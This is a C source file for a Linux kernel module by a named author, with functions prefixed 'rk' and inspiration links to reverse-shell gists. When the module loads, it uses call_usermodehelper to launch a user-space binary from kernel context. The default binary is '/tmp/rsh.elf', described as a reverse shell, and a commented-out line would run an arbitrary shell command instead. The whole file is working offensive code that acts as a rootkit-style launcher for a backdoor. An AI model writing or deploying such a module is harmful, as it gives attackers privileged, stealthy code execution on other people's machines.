/* GitHub*
 * Inspirations
 * https://github.com/loneicewolf/EXEC_LKM
 * [compact_linux_reverse_shell.c](https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597)
 * [compact_windows_reverse_shell.c](https://gist.github.com/loneicewolf/03d71d65735d8b2d34b5c60b1232d144)
 * Kernel.org*
 * https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html
 * https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper-setup.html
 * https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper-exec.html
 * *External sites
 * https://developer.ibm.com/articles/l-user-space-apps/
 * https://gta.ufrj.br/ensino/eel878/sockets/
 * Stack*Sites
 * https://stackoverflow.com/q/17803517/14346786
 */
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("William Martens");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("LKM that launches a C application, or just executing a command.");
static int __init  rk_init(void);
static void __exit rk_exit(void);
module_init(rk_init);
module_exit(rk_exit);
static char *app = "/tmp/rsh.elf"; // default application; see rsh.c
module_param(app, charp, S_IRUGO); // allows input of the value for app (this can be a command too)
static int __init rk_init(void){
    printk("[+]LKM loaded");
    char *argv[] = {app,NULL};
    /* 
    * we can also use a hard coded command (described below)
    * (NOTE if you do, comment out the above line (char *argv...)
    * and un-comment the below line
    * char *argv[] = {"/bin/sh","-c","ps >> /tmp/W",NULL};
    */
    static char *env[] = {"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
    return 0;
}
static void __exit rk_exit(void){
	printk("[-]LKM unloaded");
}
